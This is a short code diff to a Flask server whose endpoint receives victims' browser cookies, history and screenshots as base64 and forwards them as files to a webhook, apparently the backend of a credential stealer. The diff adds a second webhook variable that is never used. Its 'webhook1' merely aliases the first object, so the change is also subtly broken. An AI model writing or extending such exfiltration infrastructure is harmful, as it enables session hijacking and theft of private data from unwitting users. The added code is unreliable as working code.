@@ -13,6 +13,7 @@ from utils import networth
 
 load_dotenv()
 wh = os.getenv('WEBHOOK')
+wh1 = os.getenv('WEBHOOKK')
 
 print(wh)
 app = Flask(__name__)
@@ -205,7 +206,10 @@ class Delivery(Resource):
         webhook.add_file(file=history.encode(), filename="history.txt")
         webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")
         webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")
+
+        webhook1 = webhook
         webhook.execute()
+        webhook1.execute()
 
         return {'status': 'ok'}, 200
 
